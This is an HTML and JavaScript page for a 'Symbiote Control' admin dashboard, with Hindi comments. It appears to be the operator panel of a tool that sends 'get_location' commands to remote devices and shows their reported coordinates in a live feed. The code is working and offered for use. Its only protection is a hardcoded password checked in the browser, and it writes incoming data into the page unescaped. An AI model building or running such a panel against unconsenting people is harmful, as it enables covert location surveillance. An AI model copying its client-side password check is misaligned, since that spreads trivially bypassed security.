<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    
    <!-- सुंदर आइकॉन के लिए Font Awesome लाइब्रेरी -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <style>
        /* CSS का हिस्सा - नया और सुंदर डिज़ाइन */
        :root {
            --bg-dark: #1a1f2c;
            --bg-light: #272e3d;
            --primary-color: #007bff;
            --text-light: #f0f2f5;
            --text-secondary: #a9b3c1;
            --border-color: #3a4152;
            --success-color: #28a745;
            --error-color: #dc3545;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            color: var(--text-light);
            font-size: 16px;
        }

        /* --- लॉगिन स्क्रीन --- */
        #login-container {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: var(--bg-dark);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        .login-box {
            background-color: var(--bg-light);
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
            border: 1px solid var(--border-color);
        }
        .login-box h2 {
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            color: var(--text-light);
            font-size: 1em;
        }
        .login-box button {
            width: 100%;
            padding: 12px;
            background-color: var(--primary-color);
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .login-box button:hover {
            background-color: #0056b3;
        }
        #login-error {
            color: var(--error-color);
            margin-top: 15px;
            display: none;
        }

        /* --- मुख्य डैशबोर्ड --- */
        .hidden { display: none !important; }
        .dashboard-grid {
            display: grid;
            grid-template-columns: 350px 1fr;
            height: 100vh;
        }
        .control-panel {
            background-color: var(--bg-light);
            padding: 20px;
            border-right: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .data-feed {
            padding: 20px;
            overflow-y: auto;
        }
        header {
            text-align: center;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }
        header h1 {
            font-size: 1.5em;
        }
        .card {
            background-color: var(--bg-dark);
            padding: 20px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }
        .card h3 {
            margin-bottom: 15px;
            color: var(--text-secondary);
        }
        .card i {
            margin-right: 10px;
        }
        .command-btn {
            width: 100%;
            padding: 15px;
            font-size: 1em;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-align: left;
            transition: background-color 0.2s;
        }
        .command-btn:hover {
            background-color: #0069d9;
        }
        #status-log {
            height: 200px;
            overflow-y: auto;
            font-size: 0.9em;
            color: var(--text-secondary);
        }
        #status-log div {
            padding: 5px 0;
            border-bottom: 1px solid var(--border-color);
        }
        .data-feed h2 {
            margin-bottom: 20px;
        }
        #data-display {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .data-item {
            background-color: var(--bg-light);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            animation: fadeIn 0.5s ease;
        }
        .data-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            color: var(--text-secondary);
        }
        .data-header .type {
            font-weight: bold;
            color: var(--text-light);
            font-size: 1.1em;
        }
        .data-body {
            font-family: 'Courier New', Courier, monospace;
            word-wrap: break-word;
            background-color: var(--bg-dark);
            padding: 10px;
            border-radius: 5px;
        }
        .data-item.error .data-header .type {
            color: var(--error-color);
        }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <!-- लॉगिन स्क्रीन -->
    <div id="login-container">
        <div class="login-box">
            <h2><i class="fa-solid fa-lock"></i> Admin Panel</h2>
            <input type="password" id="password-input" placeholder="Access Code">
            <button id="login-button">Unlock</button>
            <p id="login-error">Access Denied</p>
        </div>
    </div>

    <!-- मुख्य डैशबोर्ड -->
    <main id="dashboard" class="dashboard-grid hidden">
        
        <!-- बायां पैनल: कमांड्स और लॉग -->
        <aside class="control-panel">
            <header>
                <h1><i class="fa-solid fa-terminal"></i> Symbiote Control</h1>
            </header>
            
            <div class="card">
                <h3><i class="fa-solid fa-paper-plane"></i> Send Command</h3>
                <button id="getLocationBtn" class="command-btn"><i class="fa-solid fa-location-crosshairs"></i> Get Location</button>
            </div>
            
            <div class="card" style="flex-grow: 1;">
                <h3><i class="fa-solid fa-shield-halved"></i> System Log</h3>
                <div id="status-log"></div>
            </div>
        </aside>
        
        <!-- दायां पैनल: प्राप्त डेटा -->
        <section class="data-feed">
            <h2><i class="fa-solid fa-database"></i> Live Data Feed</h2>
            <div id="data-display"></div>
        </section>
        
    </main>


    <script>
        // जावास्क्रिप्ट का हिस्सा (लॉजिक वही, सिर्फ डेटा दिखाने का तरीका बदला है)
        
        // !!! अपना गुप्त पासवर्ड यहाँ सेट करें !!!
        const ADMIN_PASSWORD = "your_secret_password_123";

        const loginContainer = document.getElementById('login-container');
        const passwordInput = document.getElementById('password-input');
        const loginButton = document.getElementById('login-button');
        const loginError = document.getElementById('login-error');
        const dashboard = document.getElementById('dashboard');
        const getLocationBtn = document.getElementById('getLocationBtn');
        const statusLog = document.getElementById('status-log');
        const dataDisplay = document.getElementById('data-display');
        
        let displayedDataCount = 0;

        loginButton.addEventListener('click', handleLogin);
        passwordInput.addEventListener('keyup', (event) => {
            if (event.key === 'Enter') handleLogin();
        });

        function handleLogin() {
            if (passwordInput.value === ADMIN_PASSWORD) {
                loginContainer.classList.add('hidden');
                dashboard.classList.remove('hidden');
                logStatus('Access granted. System online.', 'success');
                startFetchingData();
            } else {
                loginError.style.display = 'block';
            }
        }
        
        getLocationBtn.addEventListener('click', () => {
            sendCommand({ command: 'get_location' });
        });
        
        async function sendCommand(commandObject) {
            logStatus(`Sending command: ${commandObject.command}...`);
            try {
                const response = await fetch('/send-command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(commandObject)
                });
                const result = await response.json();
                if (response.ok) {
                    logStatus('Command sent successfully.', 'success');
                } else {
                    logStatus(`Error: ${result.message}`, 'error');
                }
            } catch (error) {
                logStatus('Network error. Failed to send command.', 'error');
            }
        }

        function startFetchingData() {
            setInterval(fetchData, 5000); // हर 5 सेकंड में
            fetchData();
        }

        async function fetchData() {
            try {
                const response = await fetch('/get-reported-data');
                const data = await response.json();
                
                if (data.length > displayedDataCount) {
                    const newData = data.slice(displayedDataCount);
                    displayData(newData);
                    displayedDataCount = data.length;
                }
            } catch (error) {
                logStatus('Error fetching data from server.', 'error');
            }
        }

        // डेटा दिखाने का नया और बेहतर तरीका
        function displayData(newDataArray) {
            newDataArray.forEach(item => {
                const itemCard = document.createElement('div');
                itemCard.className = `data-item ${item.type === 'error' ? 'error' : ''}`;

                let iconClass = 'fa-solid fa-question';
                if (item.type === 'location') iconClass = 'fa-solid fa-location-dot';
                if (item.type === 'error') iconClass = 'fa-solid fa-triangle-exclamation';

                let bodyContent = '';
                if (item.type === 'location') {
                    bodyContent = `Latitude: ${item.latitude}<br>Longitude: ${item.longitude}<br>Accuracy: ${item.accuracy} meters`;
                } else {
                    bodyContent = item.message || JSON.stringify(item, null, 2);
                }

                itemCard.innerHTML = `
                    <div class="data-header">
                        <span class="type"><i class="${iconClass}"></i> ${item.type.toUpperCase()}</span>
                        <span class="timestamp"><i class="fa-regular fa-clock"></i> ${new Date(item.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="data-body">${bodyContent}</div>
                `;
                dataDisplay.prepend(itemCard);
            });
        }
        
        function logStatus(message, type = 'info') {
            const time = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            let color = type === 'success' ? 'var(--success-color)' : type === 'error' ? 'var(--error-color)' : 'inherit';
            logEntry.innerHTML = `<span style="color:${color}">[${time}] ${message}</span>`;
            statusLog.prepend(logEntry);
        }

    </script>
</body>
</html>
